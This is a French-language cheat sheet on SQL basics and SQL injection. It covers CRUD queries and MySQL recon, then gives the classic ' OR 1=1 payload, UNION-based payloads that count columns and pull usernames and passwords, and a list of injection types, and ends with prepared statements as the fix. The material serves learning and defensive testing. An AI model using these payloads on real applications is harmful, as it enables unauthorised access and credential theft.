---
title: SQL — bases & injection
category: web
icon: 💉
difficulty: Essentiel
tags: [sql, sqli, injection, union, mysql, blind, prepared-statements]
summary: CRUD et recon MySQL, hello-world SQLi, UNION-based, types de SQLi (in-band/error/blind/OOB) et protection par prepared statements.
updated: 2026-09-25
source: cheatsheet
---

## CRUD

```sql
INSERT INTO users (username, password) VALUES ('arthur', 'pass');
SELECT username, password FROM users WHERE role = 'admin';
UPDATE users SET password = 'new' WHERE username = 'arthur';
DELETE FROM users WHERE username = 'arthur';
```

**Clauses utiles** : `WHERE`, `AND/OR`, `LIKE 'art%'`, `ORDER BY col DESC`, `LIMIT 5 OFFSET 10`, `GROUP BY`, `COUNT/SUM/AVG/MAX/MIN`.

## MySQL recon

```sql
SHOW DATABASES;
USE db_name;
SHOW TABLES;
DESCRIBE table_name;
```

## SQLi — hello world

```
' OR 1=1;-- -
```

- `'` ferme la string du dev
- `OR 1=1` = toujours vrai → retourne tout
- `-- -` commente le reste de la requête

> **Test de vulnérabilité** : tape `'` dans un champ. Si erreur SQL → vulnérable. Si comportement change → potentiellement vulnérable (blind).

## UNION-based SQLi

```sql
-- Trouver le nombre de colonnes
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -     -- pas d'erreur = 3 colonnes

-- Extraire des données
' UNION SELECT username,password,3 FROM users-- -
```

## Types de SQLi

- **In-band** : résultat visible dans la page (classic + UNION)
- **Error-based** : les erreurs SQL donnent de l'info
- **Blind boolean** : la page change de comportement (true/false)
- **Blind time-based** : `SLEEP(5)` → page lente = vulnérable
- **Out-of-band** : exfil via DNS/HTTP callback

> **Protection** : prepared statements (parameterized queries). Le `?` placeholder empêche l'input d'être interprété comme du SQL. Les frameworks modernes le font par défaut.
